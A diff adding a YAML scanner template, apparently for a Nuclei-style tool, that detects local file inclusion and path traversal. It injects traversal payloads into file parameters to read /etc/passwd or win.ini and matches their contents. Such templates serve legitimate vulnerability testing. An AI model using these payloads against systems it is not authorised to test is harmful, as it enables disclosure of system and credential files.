@@ -1,0 +1,28 @@
+id: lfi-path-traversal-generic
+info:
+  name: Local File Inclusion / Path Traversal (generic param)
+  severity: high
+  author: abaddon
+  description: >
+    Injects traversal sequences into common file params and matches /etc/passwd
+    or Windows win.ini signatures.
+  tags: [lfi, traversal, injection]
+confidence_threshold: 0.6
+requests:
+  - method: GET
+    path:
+      - "/?file={{payload}}"
+      - "/?page={{payload}}"
+      - "/download?file={{payload}}"
+    payloads:
+      - "../../../../../../etc/passwd"
+      - "....//....//....//....//etc/passwd"
+      - "..\\..\\..\\..\\..\\windows\\win.ini"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(fonts|extensions|mci extensions)\\]"
+        condition: or
+        confidence: 0.85
